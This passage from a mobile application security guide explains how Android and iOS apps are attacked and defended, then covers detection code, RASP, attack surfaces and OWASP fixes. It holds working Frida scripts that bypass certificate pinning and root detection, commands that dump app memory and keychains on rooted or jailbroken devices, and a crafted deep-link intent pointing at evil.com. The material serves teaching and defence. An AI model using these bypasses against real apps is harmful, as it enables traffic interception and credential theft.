    → List exported symbols (C functions visible to linker)
  
  class-dump App
    → Dumps Objective-C class headers (method names, properties)
    → Reveals ALL Objective-C method names (not obfuscated unless explicitly)
    
  Swift reflection metadata:
    strings App | grep "^s:" → Swift mangled names (demangleable)
    swift-demangle s:6MyApp15LoginViewModelC13authenticateyySS_SSt5async_tF
```

---

### 5.2 Dynamic Analysis: Runtime Hooking with Frida

**Frida architecture:**

```
Frida architecture (how it works at the OS level):

Android:
  frida-server runs as root on device (in /data/local/tmp/)
  frida-server: 
    1. Listens on TCP port 27042
    2. When script attached: injects frida-agent.so into target process
       Via: ptrace() → write frida-agent.so path to process memory
             → call dlopen() via ptrace'd execution
    3. frida-agent.so: loaded into target process, sets up JS runtime (Duktape/V8)
    4. Your JavaScript script: runs in the injected context, accesses process memory

iOS (jailbroken, unc0ver/checkra1n):
  frida-server runs as root (via jailbreak daemon injection)
  Alternative: frida-gadget.so embedded in app (works without jailbreak)

Frida-gadget (non-jailbreak):
  1. Extract IPA, inject libfrida-gadget.dylib into Mach-O binary
     using insert_dylib or repackaging
  2. Re-sign with developer certificate
  3. Gadget connects back to Frida server over USB/network
  4. Allows hooking even on non-jailbroken devices
  (This is how mobile pentesters test without jailbreak)
```

**Bypassing Certificate Pinning with Frida:**

```javascript
// Frida script: bypass Android OkHttp certificate pinning

Java.perform(function() {
    // Target OkHttp3 CertificatePinner
    var CertificatePinner = Java.use("okhttp3.CertificatePinner");
    
    // Override the check() method — this is what validates the pin
    CertificatePinner.check.overload('java.lang.String', 'java.util.List')
                     .implementation = function(hostname, peerCertificates) {
        console.log("[*] Pinning check bypassed for: " + hostname);
        // Don't call original implementation → no exception thrown → pinning bypassed
        return;
    };
    
    // Also bypass the other check() overload
    CertificatePinner.check.overload('java.lang.String', '[Ljava.security.cert.Certificate;')
                     .implementation = function(hostname, certs) {
        console.log("[*] Pinning check bypassed (cert array) for: " + hostname);
        return;
    };
    
    // Bypass TrustManager implementation (for custom TrustManagers)
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    
    // Create a "trust all" TrustManager
    var TrustManagers = [
        Java.registerClass({
            name: "com.bypass.TrustAllManager",
            implements: [TrustManager],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        }).$new()
    ];
    
    // Inject into SSLContext
    var TLSContext = SSLContext.getInstance("TLS");
    TLSContext.init(null, TrustManagers, null);
    SSLContext.getDefault.implementation = function() {
        return TLSContext;
    };
});
```

```javascript
// Frida script: bypass iOS certificate pinning (Swift/Objective-C)

// Method 1: Hook NSURLSession delegate
ObjC.schedule(ObjC.mainQueue, function() {
    var klass = ObjC.classes.NSURLSession;
    
    // Hook URLSession:didReceiveChallenge:completionHandler:
    Interceptor.attach(
        ObjC.classes.NSURLSession.instanceMethod('URLSession:didReceiveChallenge:completionHandler:')
            .implementation,
        {
            onEnter: function(args) {
                // Invoke completionHandler with UseCredential + server trust
                var completionHandler = new ObjC.Block(args[4]);
                var credential = ObjC.classes.NSURLCredential
                    .credentialForTrust_(args[3]);  // args[3] = serverTrust
                completionHandler.invoke([
                    2,         // NSURLSessionAuthChallengeUseCredential = 2
                    credential
                ]);
                // Return without calling original → pinning check skipped
            }
        }
    );
});

// Method 2: Hook SecTrustEvaluateWithError (low-level)
Interceptor.attach(Module.findExportByName("Security", "SecTrustEvaluateWithError"), {
    onLeave: function(retval) {
        retval.replace(ptr("0x1"));  // Return errSecSuccess (1)
    }
});
```

**What happens mechanically when Frida hooks a function:**

```
Frida's Interceptor.attach() mechanism:
  1. Find target function address in process memory
  2. Read first N bytes of function (enough for a JMP instruction)
  3. Write a JMP instruction to Frida's trampoline:
     Original: MOV X0, X1 / ADD X2, X3 / ...
     Patched:  JMP 0xfrida_trampoline / NOP / ...
  4. Frida trampoline:
     a. Save all registers
     b. Call JavaScript onEnter callback
     c. Execute the original bytes that were overwritten
     d. JMP to rest of original function
     e. After function returns: call onLeave callback
     f. Restore registers
     g. Return to caller

This is why EDR/RASP can detect Frida:
  - The JMP instruction where there should be function prologue bytes
  - The frida-agent.so mapped into the process
  - The JavaScript runtime thread running
  - Characteristic memory patterns (gadget signatures)
```

---

### 5.3 Memory Dumping on Jailbroken/Rooted Devices

**Android LSASS-equivalent: dumping app memory:**

```
On rooted device:
  1. Find process: adb shell ps | grep com.example.app
     → PID: 12345
  
  2. Read process memory maps:
     adb shell cat /proc/12345/maps
     → Lists all mapped regions: [start-end] permissions file_name
     → Find: heap, stack, anonymous executable mappings
  
  3. Dump memory region:
     adb shell "dd if=/proc/12345/mem bs=1 skip=$((0x12000000)) count=$((0x1000)) 2>/dev/null" > region.bin
     → Reads directly from /proc/{pid}/mem — kernel allows this with ptrace permissions
  
  4. Analyze dump:
     strings region.bin | grep -E "password|token|key|secret"
     → Extract secrets from heap memory
     
     hexdump -C region.bin | grep -A 2 "BEGIN RSA"
     → Find private keys in memory
  
  5. Decrypt SQLCipher database:
     With root access to /data/data/{package}/databases/
     → Find SQLCipher passphrase in memory (it's held in Java String object on heap)
     → Once passphrase found: sqlcipher -key "passphrase" database.db

Tools: Fridump, objection memory dump, r2frida
  frida -U com.example.app -l dump.js
  objection -g com.example.app explore → memory dump
```

**iOS memory dumping (jailbroken):**

```
On jailbroken device:
  1. Bypass FairPlay encryption: clutch / frida-ios-dump
     clutch -d com.example.app
     → Decrypts App Store binary by dumping it from memory AFTER iOS decrypts it
     → iOS's FairPlay decrypts into memory → dump the decrypted pages
     → Result: cleartext Mach-O binary for analysis in Ghidra/IDA
  
  2. Runtime class inspection:
     cycript -p AppName → inject CycriptApp into running process
     cy# [UIApplication sharedApplication].windows
     cy# [NSUserDefaults standardUserDefaults].dictionaryRepresentation()
     → Interactively inspect Objective-C object state at runtime
  
  3. Dump Keychain items:
     On jailbroken device: all Keychain items accessible regardless of protection class
     → Keychain protection classes: meaningless on jailbreak (kernel compromised)
     
     Tool: keychain-dumper (uses unsandboxed access to /private/var/Keychains/keychain-2.db)
     → Returns all Keychain items including "WhenUnlocked" items
     → Why: Keychain protection depends on the passcode key being in SEP
             Jailbreak exploits don't necessarily compromise SEP
             BUT: if device is unlocked when dump runs → all "WhenUnlocked" items accessible
```

---

### 5.4 Exploiting Exported Activities (Android)

**Finding and exploiting exported components:**

```
Step 1: Find exported components
  apktool d app.apk -o decoded/
  grep -n "exported=\"true\"" decoded/AndroidManifest.xml
  
  Or via ADB:
  adb shell dumpsys package com.example.app | grep -A 3 "Activity"
  
  Common finding:
  <activity android:name=".ui.DeepLinkActivity"
            android:exported="true">
    <intent-filter>
      <action android:name="android.intent.action.VIEW"/>
      <data android:scheme="myapp"/>
    </intent-filter>
  </activity>

Step 2: Send crafted Intent via ADB
  adb shell am start -n "com.example.app/.ui.DeepLinkActivity" \
    -a android.intent.action.VIEW \
    -d "myapp://action?token=INJECT_HERE&redirect=https://evil.com"
  
  → If DeepLinkActivity passes these to WebView:
    WebView.loadUrl("https://evil.com") → SSRF or credential theft
  → If it passes to JavaScript bridge:
    webView.evaluateJavascript("userCode('" + redirect + "')", null) → XSS in WebView

Step 3: Activity tap-jacking
  Attacker installs transparent overlay activity
  When victim's Activity is visible: attacker's activity overlays it
  User thinks they're clicking the legit button; they're clicking attacker's UI
  
  Requires: android:windowIsTranslucent=true in attacker's theme
  Mitigation: FLAG_SECURE on windows, filterTouchesWhenObscured on views
```

---

## 6. Security Controls & Defensive Mechanics

### 6.1 Binary Obfuscation

**Android ProGuard/R8:**

```
ProGuard: bytecode shrinker, optimizer, obfuscator
R8: Google's replacement for ProGuard (faster, better integration)

What it does:
  - Rename classes, methods, fields to meaningless names:
    com.example.authentication.LoginManager → a.b.c
    void validateCredentials(String user, String pass) → void a(String a, String b)
  - Remove unused code (dead code elimination)
  - Inline simple methods
  - Remove log statements in release builds

Limitations:
  - Method signatures still visible in DEX bytecode
  - String literals NOT obfuscated by default (must add custom rules)
  - Reflection calls cannot be renamed (breaks ProGuard analysis)
  - Native method names: JNI conventions require specific names → NOT obfuscated
  - Layout resource names: visible in resources.arsc

Advanced obfuscation (commercial tools):
  DexGuard, Arxan, Guardsquare:
  - String encryption: "apiKey" stored as byte array + XOR key, decrypted at runtime
  - Control flow obfuscation: add fake branches, reorder code
  - Class encryption: DEX classes encrypted, decrypted to memory at load
  - Native code: JNI bridge, logic moved to harder-to-analyze ARM assembly
  
  Even with these: runtime memory still contains decrypted state
  → Frida hooks the decryption function → get plaintext at runtime
```

**iOS Objective-C/Swift Obfuscation:**

```
Objective-C: significant limitation — method names in __objc_methnames section
  class-dump always recovers full class hierarchy and method names
  Reason: Objective-C runtime requires method names for message dispatch
  
  Workaround: implement security-critical code in C/C++ with static functions
    Static C functions: not exported, no symbol table entry
    Obfuscation: strip symbols, encrypt/encode the binary section

Swift:
  Swift binary names are mangled but demangle-able:
  $s3App5UserVC15authenticateWithyySS_SSt → authenticateWith(username:password:)
  
  No equivalent of class-dump for pure Swift (no ObjC metadata)
  BUT: string literals, URL patterns still visible in binary
  
  Commercial: iXGuard, Obfuscator-LLVM
  - Rename symbols, split functions, add opaque predicates
  - Anti-debug: ptrace() self-call prevents debugger attachment
```

### 6.2 Jailbreak and Root Detection

**Android Root Detection Techniques:**

```java
public class RootDetection {
    
    public static boolean isRooted() {
        return checkSuBinary() || 
               checkBusybox() || 
               checkSuperuserAPK() || 
               checkBuildTags() || 
               checkMountedPaths() ||
               checkTestKeys() ||
               checkDangerousProps();
    }
    
    // Check 1: su binary exists in common locations
    private static boolean checkSuBinary() {
        String[] paths = {
            "/system/xbin/su", "/system/bin/su", "/sbin/su",
            "/data/local/xbin/su", "/data/local/bin/su",
            "/data/local/su", "/system/sd/xbin/su",
            "/system/bin/failsafe/su", "/su/bin/su"
        };
        for (String path : paths) {
            if (new File(path).exists()) return true;
        }
        return false;
    }
    
    // Check 2: Build properties indicate test/debug build
    private static boolean checkBuildTags() {
        // Release builds: android.os.Build.TAGS = "release-keys"
        // Rooted/custom ROMs: "test-keys", "dev-keys"
        String buildTags = android.os.Build.TAGS;
        return buildTags != null && buildTags.contains("test-keys");
    }
    
    // Check 3: Dangerous system properties
    private static boolean checkDangerousProps() {
        // ro.debuggable = 1: engineering/debug build
        // ro.secure = 0: ADB root enabled
        // ro.build.type = "eng" or "userdebug"
        try {
            Class<?> sysProp = Class.forName("android.os.SystemProperties");
            Method getMethod = sysProp.getMethod("get", String.class);
            
            String debuggable = (String) getMethod.invoke(null, "ro.debuggable");
            if ("1".equals(debuggable)) return true;
            
            String secure = (String) getMethod.invoke(null, "ro.secure");
            if ("0".equals(secure)) return true;
        } catch (Exception e) {}
        return false;
    }
    
    // Check 4: Magisk-specific detection
    private static boolean checkMagisk() {
        // Magisk files
        String[] magiskPaths = {
            "/sbin/.magisk", "/sbin/.core/mirror",
            "/data/adb/magisk.img", "/data/adb/modules/"
        };
        for (String path : magiskPaths) {
            if (new File(path).exists()) return true;
        }
        
        // Check if MagiskManager is installed
        try {
            context.getPackageManager().getPackageInfo("com.topjohnwu.magisk", 0);
            return true;  // MagiskManager installed
        } catch (PackageManager.NameNotFoundException e) {}
        
        return false;
    }
    
    // Check 5: Try to execute su
    private static boolean trySuExecution() {
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "id"});
            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String output = br.readLine();
            return output != null && output.contains("uid=0");
        } catch (IOException e) {
            return false;  // su not executable
        }
    }
}
```

**iOS Jailbreak Detection:**

```swift
class JailbreakDetection {
    
    static func isJailbroken() -> Bool {
        return checkJailbreakFiles() ||
               checkSandboxViolation() ||
               checkDynamicLibraries() ||
               checkCydiaInstalled() ||
               checkSymlinkToPrivateDir() ||
               checkWritableSystem()
    }
    
    // Check 1: Jailbreak-specific files
    static func checkJailbreakFiles() -> Bool {
        let paths = [
            "/Applications/Cydia.app",
            "/Applications/blackra1n.app",
            "/Library/MobileSubstrate/MobileSubstrate.dylib",
            "/bin/bash",           // Not present on non-jailbroken
            "/usr/sbin/sshd",      // SSH server (jailbreak convenience tool)
            "/etc/apt",            // Cydia package manager
            "/private/var/lib/apt/", 
            "/usr/bin/ssh",
            "/private/var/stash",
            "/private/var/lib/cydia",
            "/private/var/mobile/Library/SBSettings/Themes",
            "/usr/libexec/cydia",
            "/usr/sbin/frida-server",  // Direct Frida detection
        ]
        return paths.contains { FileManager.default.fileExists(atPath: $0) }
    }
    
    // Check 2: Attempt sandbox violation
    static func checkSandboxViolation() -> Bool {
        // Non-jailbroken: cannot write outside app sandbox
        let testPath = "/private/jailbreak_test.txt"
        do {
            try "test".write(toFile: testPath, atomically: true, encoding: .utf8)
            try FileManager.default.removeItem(atPath: testPath)
            return true  // Write succeeded = jailbroken
        } catch {
            return false  // Write failed = not jailbroken
        }
    }
    
    // Check 3: Unexpected dylibs (MobileSubstrate, Frida)
    static func checkDynamicLibraries() -> Bool {
        // Swift: check linked libraries via dlopen
        let suspiciousPaths = [
            "/usr/lib/libcycript.dylib",
            "/usr/lib/TweakInject.dylib",
        ]
        return suspiciousPaths.contains { dlopen($0, RTLD_NOW) != nil }
    }
    
    // Check 4: Calling fork() — blocked on non-jailbroken
    static func checkForkAbility() -> Bool {
        // fork() is blocked by sandbox policy on real iOS
        // On jailbroken: fork() succeeds
        let pid = fork()
        if pid >= 0 {
            if pid > 0 { waitpid(pid, nil, 0) }
            return true  // fork succeeded = jailbroken
        }
        return false
    }
    
    // Check 5: OpenURL to Cydia
    static func checkCydiaScheme() -> Bool {
        let cydiaURL = URL(string: "cydia://package/com.example.package")!
        return UIApplication.shared.canOpenURL(cydiaURL)
        // On jailbroken: Cydia registered its URL scheme → returns true
    }
}
```

**Why root/jailbreak detection is inherently limited:**

```
The fundamental problem: all these checks run AS THE APP.
On a rooted/jailbroken device, any check can be hooked and bypassed:

Frida bypass of root detection:
  Java.perform(function() {
    // Bypass File.exists() check
    var File = Java.use("java.io.File");
    File.exists.implementation = function() {
      var path = this.getAbsolutePath();
      if (path.indexOf("su") !== -1 || path.indexOf("magisk") !== -1) {
        return false;  // Lie: say the file doesn't exist
      }
      return this.exists.call(this);
    };
  });

This is an arms race:
  - App detects Frida → attacker uses Frida with anti-detection patches
  - App detects custom kernel → attacker uses kernel patch that hides itself
  - App uses native code for detection → attacker patches native library
  
The conclusion: root/jailbreak detection is a speed bump, not a wall.
It raises the bar for casual attackers but determined ones bypass it.
Best combined with server-side attestation (SafetyNet/AppAttest) which
the app cannot bypass (validation happens on server with Google/Apple).
```

### 6.3 RASP (Runtime Application Self-Protection)

```
RASP: security controls embedded in the app that monitor and respond
to threats at runtime (in-app IDS/IPS).

Android RASP example implementation:

public class RASPMonitor {
    
    private static final long CHECK_INTERVAL_MS = 5000;  // Check every 5s
    
    public void startMonitoring(Context context) {
        ScheduledExecutorService executor = Executors.newScheduledThreadPool(1);
        executor.scheduleAtFixedRate(() -> {
            checkIntegrity(context);
        }, 0, CHECK_INTERVAL_MS, TimeUnit.MILLISECONDS);
    }
    
    private void checkIntegrity(Context context) {
        // 1. Verify own APK signature matches expected
        try {
            PackageInfo info = context.getPackageManager()
                .getPackageInfo(context.getPackageName(), 
                                PackageManager.GET_SIGNATURES);
            String certHash = computeHash(info.signatures[0].toByteArray());
            if (!EXPECTED_CERT_HASH.equals(certHash)) {
                // App has been repacked with different certificate
                respond(ThreatType.REPACKAGED_APP);
            }
        } catch (Exception e) { respond(ThreatType.INTEGRITY_CHECK_FAILED); }
        
        // 2. Detect if running in emulator
        if (isEmulator()) {
            respond(ThreatType.EMULATOR_DETECTED);
        }
        
        // 3. Detect Frida/hook presence
        if (detectFrida()) {
            respond(ThreatType.HOOKING_FRAMEWORK);
        }
        
        // 4. Check for memory integrity (native)
        if (!nativeCheckMemoryIntegrity()) {
            respond(ThreatType.MEMORY_TAMPERING);
        }
    }
    
    private boolean detectFrida() {
        // Check for frida-agent in /proc/self/maps
        try (BufferedReader reader = new BufferedReader(
                new FileReader("/proc/self/maps"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                if (line.contains("frida") || 
                    line.contains("linjector") ||
                    line.contains("gum-js-loop")) {
                    return true;
                }
            }
        } catch (IOException e) {}
        
        // Check for open TCP port 27042 (Frida server default)
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress("127.0.0.1", 27042), 100);
            return true;  // Frida server listening
        } catch (Exception e) {}
        
        // Check for characteristic Frida memory patterns
        return detectFridaInMemory();  // Native implementation
    }
    
    private void respond(ThreatType threat) {
        // Log tamper event (to backend — for threat intelligence)
        telemetry.logTamperEvent(threat, deviceId, timestamp);
        
        // Depending on policy: warn, restrict, or terminate
        switch (policy.getResponseFor(threat)) {
            case TERMINATE: System.exit(0); break;
            case RESTRICT: restrictSensitiveFeatures(); break;
            case WARN: showSecurityWarning(); break;
            case LOG_ONLY: break;  // Just log it
        }
    }
}
```

---

## 7. Attack Surface Mapping

### 7.1 Complete Attack Surface Diagram

```
╔══════════════════════════════════════════════════════════════════════════════════════╗
║  EXTERNAL ATTACK SURFACE (reachable without device access)                          ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                      ║
║  [A] Deep Links / URL Schemes                                                       ║
║      Android: myapp://action?param=value (any app can send)                         ║
║      iOS: myapp://action (any app can send; canOpenURL reveals installed apps)       ║
║      Universal Links / App Links: more secure (domain verified)                     ║
║      Attack: malicious website/app sends crafted deep link → parameter injection    ║
║                                                                                      ║
║  [B] Push Notifications                                                             ║
║      FCM/APNs payload delivered via push: process in background                     ║
║      If app processes notification payload without validation: injection risk        ║
║      Silent push (iOS): app wakes in background, processes payload silently         ║
║                                                                                      ║
║  [C] Network API (backend)                                                          ║
║      If TLS not pinned: MITM possible on untrusted networks                         ║
║      API responses: if not validated, injected data processed as trusted            ║
║                                                                                      ║
║  [D] QR Codes / Scanned Input                                                       ║
║      QR code → deep link or URL → processed by app                                 ║
║      Attacker controls: entire URL including parameters                             ║
╚══════════════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════════════════╗
║  LOCAL ATTACK SURFACE (requires device access / malicious app / ADB)               ║
╠══════════════════════════════════════════════════════════════════════════════════════╣
║                                                                                      ║
║  [E] Exported Android Components                                                    ║
║      Activities: launched by any app or ADB                                         ║
║      Services: bound by any app                                                      ║
║      Content Providers: queried by any app (if exported)                            ║
║      Broadcast Receivers: receives any matching broadcast                            ║
║                                                                                      ║
║  [F] Local File System                                                              ║
║      SharedPreferences (unencrypted): readable by root                              ║
║      SQLite databases: readable by root, extractable via ADB backup                 ║
║      External storage (SD card, /sdcard/): readable by ALL apps (no permission      ║
║        needed on Android <10; MANAGE_EXTERNAL_STORAGE on 10+)                      ║
║      Log files: adb logcat captures all logs (debug builds include sensitive data)  ║
║      Pasteboard/Clipboard: any app can read clipboard content (iOS <14 requires     ║
║        user interaction alert; Android: no restriction before Android 10)           ║
║                                                                                      ║
║  [G] IPC Channels                                                                   ║
║      Binder transactions: if service doesn't verify caller UID                      ║
║      UNIX domain sockets: permissions may be world-accessible                       ║
║      Pipes / Named pipes: similar concern                                            ║
║                                                                                      ║
║  [H] Memory                                                                         ║
║      Heap: secrets in plaintext (without RASP memory protection)                    ║
║      Logs/Crash dumps: may contain stack traces with PII/secrets                   ║
║      Screenshots: OS screenshot includes sensitive UI (banking apps use FLAG_SECURE) ║
║                                                                                      ║
║  [I] Hardware / Physical Access                                                     ║
║      Unlocked device: screen reading, app switching, copy-paste                     ║
║      ADB (USB debugging on): extract backup, run shell as app UID                   ║
║      Forensic tool (Cellebrite, etc.): extract even without USB debugging           ║
╚══════════════════════════════════════════════════════════════════════════════════════╝

Trust Boundary Visualization:
                                                  
  Internet             ┊  Device Boundary  ┊  App Sandbox  ┊  Secure Hardware
  (zero trust)         ┊  (partial trust)  ┊  (UID/sandbox)┊  (TEE/SEP)
                       ┊                   ┊               ┊
  Attacker's server    ┊  Physical access  ┊  Other apps   ┊  Cannot access
  ─────────────────    ┊  Root/jailbreak   ┊  can reach:   ┊  (keys sealed in
  Can reach:           ┊  ──────────────── ┊  exported     ┊   hardware)
  Network MITM(no pin) ┊  All files        ┊  components,  ┊
  If pinned: nothing   ┊  All memory       ┊  content prov ┊
                       ┊  Frida injection  ┊  deep links   ┊
```

---

## 8. Failure Points & Edge Cases

### 8.1 OS Updates and Backup/Restore Vulnerabilities

**Android backup vulnerabilities:**

```
ADB Backup (legacy, deprecated but still works on many devices):
  adb backup -noapk -all com.example.app
  → Creates backup.ab file
  → Extracts: SharedPreferences, Databases, Files directory
  → Does NOT extract: files marked NO_BACKUP, KeyStore keys
  
  Bypass: android:allowBackup="true" in manifest (default!) 
  Fix: android:allowBackup="false" OR use BackupAgent with exclusions:
    <full-backup-content>
      <exclude domain="sharedpref" path="credentials.xml"/>
      <exclude domain="database" path="secrets.db"/>
    </full-backup-content>

Cloud backup (Google Backup):
  Automatically backs up: SharedPreferences, Databases to Google Drive
  User: can restore to new device
  Risk: encrypted backup key accessible to user → backup downloaded by attacker
         if Google account compromised
  
  Files marked with Context.MODE_PRIVATE → still backed up unless excluded
  KeyStore keys: NOT backed up (hardware-bound)
  SQLCipher databases: backed up BUT encrypted (safe if key not also backed up)
  
OS Update race condition:
  During Android update: system partitions remounted RW temporarily
  SELinux: may be in permissive mode during boot of new OS
  Risk: brief window where app data accessible
  In practice: not exploitable without physical access at exact moment

iOS Backup (iTunes / Finder / iCloud):
  Local (unencrypted): all app data EXCEPT:
    - "This Device Only" Keychain items
    - Items in NSURLIsExcludedFromBackupKey files
  Local (encrypted): passwords stored in backup
    → Attacker with iTunes backup + backup password → full app data
  iCloud: only items in Documents/ unless developer uses NSFileManager exclusions
  
  Keychain backup behavior:
    kSecAttrAccessibleWhenUnlocked: backed up to iCloud (encrypted)
    kSecAttrAccessibleWhenUnlockedThisDeviceOnly: NOT backed up
    
  Critical: credentials in kSecAttrAccessibleWhenUnlocked (no "ThisDeviceOnly")
             → backed up → restore on attacker's device → access credentials
```

### 8.2 Keyboard Cache and Input Method Vulnerabilities

```
Android keyboard cache:
  Third-party keyboards learn from user input (autocorrect, predictions)
  Any string typed into your app: may be cached by the keyboard IME
  
  Prevention: mark fields as not completion-suggestible:
  editText.setInputType(InputType.TYPE_TEXT_VARIATION_PASSWORD |
                        InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS);
  // Or in XML:
  android:inputType="textPassword"  // Disables suggestions, masks input
  android:importantForAutofill="no" // Excludes from Autofill framework
  
  Risk: sensitive text fields with textNoSuggestions NOT set →
        attacker installs keyboard, reads cached words → reconstruct passwords
  
  IME (Input Method Editor) permissions: 
    Third-party keyboards have DANGEROUS permission: READ_INPUT
    → They see every character typed in EVERY app
    → Solution: use system keyboard only (TextInputType.visiblePassword marks secure)

iOS keyboard cache:
  UITextField.autocorrectionType = .no → disables cache for this field
  UITextField.isSecureTextEntry = true → auto-disables cache AND masks characters
  
  In SwiftUI:
  TextField("Password", text: $password)
    .textContentType(.password)
    .autocorrectionDisabled(true)
    .textInputAutocapitalization(.never)
  
  Notes on SecureField in iOS:
    SecureField: never cached, not accessible to screenshot, not in logs
    UITextField with isSecureTextEntry: also never cached
    
  Clipboard risk (iOS <14):
    App calls UIPasteboard.general.string → reads clipboard silently
    iOS 14+: shows toast "App pasted from clipboard"
    But: app can still READ clipboard, just user is informed
    Mitigation: never read clipboard for passwords; use secure paste UI
```

### 8.3 RASP Bypasses via Custom Kernels

```
The nuclear option: a custom kernel that lies to user-space checks.

How custom kernels bypass detection:
  
  1. Magisk systemless root:
     → Doesn't modify /system partition
     → Uses magic mount (bind mount over /system to add su)
     → ro.build.tags: patched in kernel to return "release-keys"
     → Many file existence checks: kernel intercepts stat() and returns ENOENT
     
  2. systemless module framework (KernelSU, APatch):
     → su implemented as kernel module
     → File system operations: redirected at VFS (Virtual File System) layer
     → stat("/system/xbin/su"): kernel intercepts → returns -ENOENT
     → Even if app reads /proc/self/maps: kernel filters out Magisk entries
  
  3. Custom kernel (AOSP-based with modifications):
     → /proc/self/maps: modified to hide injected libraries
     → Build properties: hardcoded to pass test-key checks
     → ptrace: allowed unconditionally (RASP ptrace-self check bypassed)
     → Fork: allowed despite "sandbox" (RASP fork check bypassed)
  
  This is why RASP root detection is fundamentally limited:
    All checks are made by user-space code
    If the kernel is modified: it can lie about ANYTHING
    Root of trust cannot be established in user-space
  
  What still works against custom kernels:
    - Server-side attestation (SafetyNet/AppAttest):
        Attestation uses hardware-backed cryptography
        TEE/SEP measures the boot chain (uses hardware-backed roots)
        If kernel is custom: bootloader hash changes → different PCRs
        TEE attestation fails: server rejects the request
        This cannot be bypassed from software (TEE is separate processor)
    
    - Behavioral analysis on backend:
        Even if device lies about its state: backend observes behavior
        Requests from "unusual" device fingerprints, timing patterns
        Anomaly detection catches suspicious patterns even without jailbreak signal
```

---

## 9. Mitigations & Observability

### 9.1 Engineering Fixes for OWASP Mobile Top 10

**M1: Improper Credential Usage**

```
Wrong:
  private static final String API_KEY = "sk-1234abcd";
  
Right:
  1. Never in source code
  2. Android: KeyStore-backed symmetric key, encrypted config fetched from server
  3. iOS: Keychain with kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly
  4. Backend: credentials fetched at runtime with valid attestation
  5. Certificate pinning: even if key leaked, MITM cannot intercept new credentials
```

**M2: Inadequate Supply Chain Security**

```
Android:
  - app.build.gradle: pin dependencies to exact versions + SHA-256 verification
    implementation("com.squareup.okhttp3:okhttp:4.11.0") {
        // This doesn't verify hash — use dependency verification file:
    }
    // Create: gradle/verification-metadata.xml with SHA-256 of each dependency
  - R8/ProGuard: minimize attack surface (remove unused libraries)
  - Only use libraries from trusted, actively maintained sources

iOS:
  - Swift Package Manager: uses .resolved file with exact SHA-256 of each dependency
  - CocoaPods: use exact versions in Podfile.lock, audit Podspecs
  - Validate: no unnecessary capabilities in third-party SDKs
```

**M3: Insecure Authentication**

```
Android biometric implementation (correct):
  // Create CryptoObject BEFORE showing biometric prompt
  // This means authentication and crypto operation are ATOMIC
  
  BiometricPrompt.AuthenticationCallback callback = new BiometricPrompt.AuthenticationCallback() {
    @Override
    public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {
      // result.getCryptoObject().getCipher() is now unlocked by TEE auth
      Cipher cipher = result.getCryptoObject().getCipher();
      // Use cipher for key operation — this cipher ONLY works after biometric
      byte[] decrypted = cipher.doFinal(encryptedData);
      // Process decrypted data...
    }
  };
  
  // Wrong: checking boolean "is_authenticated" → bypassable
  // Right: keystore key only usable with crypto object from successful auth
```

**M5: Insecure Communication**

```
Android Network Security Config (recommended minimum):
res/xml/network_security_config.xml:

<network-security-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-01-01">
            <pin digest="SHA-256">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=</pin>
            <pin digest="SHA-256">BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=</pin>
        </pin-set>
    </domain-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system"/>
            <!-- Do NOT include: <certificates src="user"/> -->
            <!-- User-installed certs (Burp Suite): rejected -->
        </trust-anchors>
    </base-config>
</network-security-config>

AndroidManifest.xml:
<application android:networkSecurityConfig="@xml/network_security_config">

iOS equivalent:
Info.plist:
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key><false/>
    <key>NSExceptionDomains</key>
    <dict>
        <!-- No exceptions if possible -->
    </dict>
</dict>
```

**M9: Insecure Data Storage**

```
Android — secure data storage decision tree:
  Credentials, tokens, session keys:
    → KeyStore (AES-GCM, hardware-backed, auth-required)
    → NEVER SharedPreferences plaintext
  
  Large sensitive datasets:
    → SQLCipher with key FROM KeyStore (key derived in TEE, never exposed)
    → Pattern:
       1. KeyStore: store AES-256 key
       2. SQLCipher: encrypt DB with KeyStore-retrieved key
       3. Key never stored anywhere else
  
  Non-sensitive caching (UI state):
    → SharedPreferences (plaintext is fine for non-sensitive state)
    → OR: EncryptedSharedPreferences (Jetpack Security — uses KeyStore under hood)

iOS — secure data storage:
  Credentials:
    → Keychain with kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly
    → + kSecAttrSynchronizable: false (no iCloud sync)
  
  Large sensitive data:
    → CoreData with SQLite store encrypted with SQLCipher
    → Key from Keychain (thisDeviceOnly)
  
  File protection:
    → Set on file creation: try data.write(to: url, options: .completeFileProtection)
    → Or NSFileManager: setAttributes([.protectionKey: .complete])
```

### 9.2 Mobile Telemetry (What to Log Without Leaking PII)

```
Tamper event telemetry schema (safe to send to backend):

{
  "event_type": "tamper_detected",
  "timestamp": "2024-01-15T09:10:14Z",
  "event_id": "uuid",
  
  "device_fingerprint": {
    // DO log: anonymized identifiers
    "android_id_hash": "SHA256(android_id)",  // Hashed, not raw
    "device_model_category": "high-end",      // Bucketed, not exact
    "os_version": "14",
    "app_version": "2.3.1",
    "build_type": "release"
  },
  
  "tamper_indicators": [
    "root_binary_found",      // Boolean flags, not file paths (which might reveal system info)
    "debug_enabled",
    "signature_mismatch"
  ],
  
  "session_id": "uuid",       // Session scoped, rotated frequently
  
  // DO NOT log:
  // "user_id": ...,          // Links to PII
  // "device_imei": ...,      // PII per GDPR
  // "exact_device_model": ..., // Too specific (fingerprinting)
  // "current_screen": ...,   // Reveals user behavior
  // "network_data": ...,     // IP address = PII in EU
}

Security-relevant telemetry (safe):
  - App version + hash (was the app modified?)
  - Certificate pinning failure events (MITM attempt indicators)
